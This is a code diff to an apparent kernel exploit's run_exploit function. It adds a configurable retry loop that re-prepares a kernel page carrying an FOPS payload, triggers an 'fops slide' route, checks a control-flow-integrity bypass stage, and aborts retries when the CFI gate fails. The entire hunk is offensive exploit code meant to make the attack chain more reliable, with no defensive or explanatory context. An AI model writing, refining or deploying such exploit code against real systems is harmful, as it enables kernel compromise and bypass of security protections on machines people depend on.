@@ -412,14 +412,37 @@ int run_exploit(int argc, char **argv) {
             attempt, fops_fresh_page_attempts);
   }
 #else
-  for (int attempt = 1; attempt <= 1; attempt++) {
+#ifdef FOPS_FRESH_PAGE_ATTEMPTS
+  const int fops_fallback_attempts = FOPS_FRESH_PAGE_ATTEMPTS;
+#else
+  const int fops_fallback_attempts = 1;
+#endif
+  for (int attempt = 1; attempt <= fops_fallback_attempts; attempt++) {
+    if (attempt != 1) {
+      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+      if (!page_base) {
+        pr_warning("app fops fresh page unavailable attempt=%d/%d\n",
+                   attempt, fops_fallback_attempts);
+        continue;
+      }
+    }
+
     int triggered = app_trigger_fops_slide_route();
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
             attempt, triggered);
+
     int verified = triggered && try_cfi_stage();
-    pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
+
+    pr_info("app fops slide attempt=%d/%d triggered=%d verified=%d "
             "step=%d errno=%d\n",
-            attempt, triggered, verified, cfi_last_step, cfi_last_errno);
+            attempt, fops_fallback_attempts, triggered, verified,
+            cfi_last_step, cfi_last_errno);
+
+    if (!verified && triggered && cfi_last_step == 14) {
+      pr_warning("app fops cfi gate failed after trigger; aborting fops retry on dirty state\n");
+      break;
+    }
+
     if (verified || cfi_dirty_seen) {
       break;
     }
